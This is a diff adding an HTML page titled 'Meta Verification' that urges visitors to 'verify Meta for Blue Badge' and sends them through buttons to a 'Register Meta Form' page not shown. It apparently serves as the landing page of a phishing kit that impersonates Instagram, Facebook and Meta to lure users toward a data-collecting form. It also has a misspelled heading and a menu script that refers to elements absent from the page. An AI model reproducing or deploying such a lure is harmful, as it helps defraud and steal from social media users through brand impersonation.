@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
+</head>
+
+<!-- Mobile Menu Toggle Button -->
+
+
+<!-- Mobile Menu -->
+<body class="flex flex-col items-center justify-center min-h-screen bg-white font-roboto">
+    <div class="text-center max-w-xl mx-auto">
+        <!-- Logo -->
+        <img src="lometa.png" alt="lometa" class="mx-auto mb-6" width="100" height="100"/>
+
+        <!-- Title -->
+        <h1 class="text-2xl font-medium mb-2">
+            Pleace Verify Meta For Blue Badge
+        </h1>
+
+        <!-- Subtext -->
+        <p class="text-sm text-gray-500 mb-6">
+            INSTAGRAM, FACEBOOK &amp; META
+        </p>
+
+        <!-- Primary Button -->
+        <div class="mt-8">
+            <a href="blue.html" class="bg-blue-600 text-white px-6 py-3 rounded-full text-lg transition hover:bg-blue-700">
+                Register Meta Form
+            </a>
+        </div>
+    </div>
+
+    <!-- Secondary Button -->
+    <div class="mt-8">
+        <a href="blue.html" class="bg-blue-600 text-white px-6 py-3 rounded-full text-lg transition hover:bg-blue-700">
+            Next
+        </a>
+    </div>
+
+    <!-- Tailwind JS Script for Menu Toggle -->
+    <script>
+        const menuToggle = document.getElementById('menu-toggle');
+        const mobileMenu = document.getElementById('mobile-menu');
+
+        menuToggle.addEventListener('click', () => {
+            mobileMenu.classList.toggle('hidden');
+        });
+    </script>
+</body>
+</html>
